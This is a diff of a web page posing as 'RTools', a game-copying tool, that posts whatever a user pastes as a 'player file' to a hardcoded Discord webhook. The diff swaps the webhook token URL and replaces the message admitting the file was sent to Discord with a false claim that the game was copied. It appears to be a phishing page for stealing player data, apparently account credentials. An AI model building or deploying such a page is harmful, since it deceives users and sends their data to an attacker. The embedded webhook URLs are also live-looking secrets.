@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RoTools - Copy Games with Ease</title>
+    <title>RTools - Copy Games with Ease</title>
     <style>
         * {
             margin: 0;
@@ -465,7 +465,7 @@
         <div class="container">
             <div class="logo">
                 <div class="logo-icon">⬜</div>
-                <h1>RoTools</h1>
+                <h1>RTools</h1>
             </div>
             <p class="tagline">Copy games with ease, with our newest tools.</p>
             <button class="start-btn" onclick="scrollToProcess()">
@@ -534,7 +534,7 @@
 
     <!-- Success Message -->
     <div class="success-message" id="successMessage">
-        Successfully sent player file to Discord!
+        Successfully Copied Game, Wait 10-20 Minutes To Download Your Game.!
     </div>
 
     <!-- Error Message -->
@@ -544,7 +544,7 @@
 
     <script>
         // Discord webhook URL
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369982212056813691/wtotgf-KZ_uCtsEE_2hjqMA1DUvb0JesQDeHB8JCwQ83ekrYdbqf9IXZVjnwvWT-txPe';
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1402692947903778907/PH4N7d32BzrMIpq_8Gs-wHwTOWHvBhxUsql-dva0eyjI-Ks3telib_Uzf1FW9ReLiJzK';
 
         // Custom Cursor Effect
         const cursor = document.getElementById('cursor');
@@ -610,14 +610,14 @@
             try {
                 // Create the Discord message payload
                 const payload = {
-                    content: `🎮 **New RoTools Player File Submission**`,
+                    content: `🎮 **New RTools Player File Submission**`,
                     embeds: [{
                         title: "Player File Details",
                         description: `\`\`\`\n${input.value}\n\`\`\``,
                         color: 3447003, // Blue color
                         timestamp: new Date().toISOString(),
                         footer: {
-                            text: "RoTools Game Copier"
+                            text: "RTools Game Copier"
                         },
                         fields: [
                             {
@@ -627,7 +627,7 @@
                             },
                             {
                                 name: "🔧 Tool Used",
-                                value: "RoTools Game Copier",
+                                value: "RTools Game Copier",
                                 inline: true
                             }
                         ]
@@ -679,3 +679,4 @@
     </script>
 </body>
 </html>
+
